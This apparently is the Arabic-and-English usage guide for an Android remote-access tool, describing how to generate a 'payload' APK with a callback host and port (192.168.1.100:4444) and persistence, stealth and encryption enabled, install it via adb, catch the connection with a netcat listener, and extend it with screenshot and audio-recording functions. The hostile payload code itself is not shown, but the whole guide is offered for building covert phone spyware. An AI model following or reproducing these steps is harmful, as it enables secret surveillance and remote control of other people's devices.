# دليل إنشاء APK حقيقي
## Real APK Building Guide

## 🚀 إنشاء APK حقيقي خطوة بخطوة

### 1. تثبيت المتطلبات

#### تثبيت Java
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install openjdk-11-jdk

# CentOS/RHEL
sudo yum install java-11-openjdk-devel

# macOS (مع Homebrew)
brew install openjdk@11

# Windows
# تحميل من: https://adoptium.net/
```

#### تثبيت Android SDK
```bash
# تثبيت تلقائي
python -c "from tools.sdk_installer import SDKInstaller; SDKInstaller().setup_complete_environment()"

# أو تثبيت يدوي
# 1. تحميل Android Studio
# 2. تثبيت Android SDK
# 3. إعداد متغيرات البيئة
```

### 2. إعداد متغيرات البيئة

#### Windows
```cmd
set ANDROID_HOME=C:\Users\%USERNAME%\AppData\Local\Android\Sdk
set PATH=%PATH%;%ANDROID_HOME%\platform-tools;%ANDROID_HOME%\build-tools\34.0.0
set JAVA_HOME=C:\Program Files\Java\jdk-11
```

#### Linux/macOS
```bash
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$PATH:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/34.0.0
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk
```

### 3. إنشاء APK

#### الطريقة الأولى: استخدام الأداة
```bash
python main.py --gui
# اختر "إنشاء البايلود" واتبع التعليمات
```

#### الطريقة الثانية: استخدام الكود مباشرة
```python
from core.payload_generator import PayloadGenerator

generator = PayloadGenerator()
result = generator.create_payload(
    name="my_payload",
    lhost="192.168.1.100",
    lport=4444,
    encryption=True,
    persistence=True,
    stealth=True
)

print(f"APK created: {result['apk_path']}")
```

### 4. التحقق من APK

#### فحص APK
```bash
# فحص محتوى APK
unzip -l my_payload.apk

# فحص AndroidManifest.xml
aapt dump xmltree my_payload.apk AndroidManifest.xml

# فحص التوقيع
jarsigner -verify -verbose -certs my_payload.apk
```

#### تثبيت APK
```bash
# تثبيت على جهاز متصل
adb install my_payload.apk

# أو نسخ إلى الجهاز
adb push my_payload.apk /sdcard/
```

## 🔧 استكشاف الأخطاء

### مشاكل شائعة

#### 1. خطأ "Android SDK not found"
```bash
# التحقق من متغيرات البيئة
echo $ANDROID_HOME
echo $PATH

# تثبيت Android SDK
python -c "from tools.sdk_installer import SDKInstaller; SDKInstaller().install_sdk()"
```

#### 2. خطأ "Java not found"
```bash
# التحقق من Java
java -version
javac -version

# تثبيت Java
python -c "from tools.sdk_installer import SDKInstaller; SDKInstaller().install_java()"
```

#### 3. خطأ "aapt not found"
```bash
# البحث عن aapt
find $ANDROID_HOME -name "aapt" -type f

# إضافة build-tools إلى PATH
export PATH=$PATH:$ANDROID_HOME/build-tools/34.0.0
```

#### 4. خطأ "dx not found"
```bash
# البحث عن dx
find $ANDROID_HOME -name "dx" -type f

# أو استخدام d8 (أحدث)
find $ANDROID_HOME -name "d8" -type f
```

### 5. خطأ في التوقيع
```bash
# إنشاء مفتاح جديد
keytool -genkey -v -keystore debug.keystore -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000

# توقيع APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore my_payload.apk androiddebugkey
```

## 📱 اختبار APK

### 1. اختبار على محاكي
```bash
# بدء محاكي Android
emulator -avd Pixel_4_API_30

# تثبيت APK
adb install my_payload.apk

# تشغيل التطبيق
adb shell am start -n com.payload.app/.MainActivity
```

### 2. اختبار على جهاز حقيقي
```bash
# تفعيل وضع المطور
# تفعيل تصحيح USB
# قبول تصحيح USB

# تثبيت APK
adb install my_payload.apk
```

### 3. اختبار الاتصال
```bash
# بدء الاستماع
python main.py

# أو استخدام netcat
nc -lvp 4444
```

## 🛠️ تخصيص APK

### 1. تعديل الكود
```bash
# فتح مشروع Android في Android Studio
# تعديل ملفات Java في app/src/main/java/
# إعادة بناء APK
```

### 2. إضافة ميزات جديدة
```java
// في PayloadService.java
private void takeScreenshot() {
    // كود التقاط لقطة الشاشة
}

private void recordAudio() {
    // كود تسجيل الصوت
}
```

### 3. تخصيص الواجهة
```xml
<!-- في activity_main.xml -->
<TextView
    android:text="تطبيق مخصص"
    android:textSize="18sp" />
```

## 📋 نصائح مهمة

### 1. الأمان
- استخدم مفاتيح توقيع قوية
- شفر البيانات الحساسة
- لا تضع معلومات حساسة في الكود

### 2. الأداء
- استخدم threading للعمليات الطويلة
- احذف الموارد غير المستخدمة
- استخدم ProGuard لتقليل حجم APK

### 3. التوافق
- اختبر على إصدارات مختلفة من Android
- استخدم minSdk و targetSdk مناسبة
- تحقق من الأذونات المطلوبة

## 🆘 الدعم

إذا واجهت مشاكل:

1. راجع ملفات السجل في `logs/`
2. تحقق من متغيرات البيئة
3. تأكد من تثبيت جميع المتطلبات
4. جرب إنشاء APK مبسط كبديل

```bash
# إنشاء APK مبسط
python -c "
from core.payload_generator import PayloadGenerator
generator = PayloadGenerator()
result = generator.create_simple_apk('test_payload', {'lhost': '192.168.1.100', 'lport': 4444})
print(f'Simple APK created: {result}')
"
```
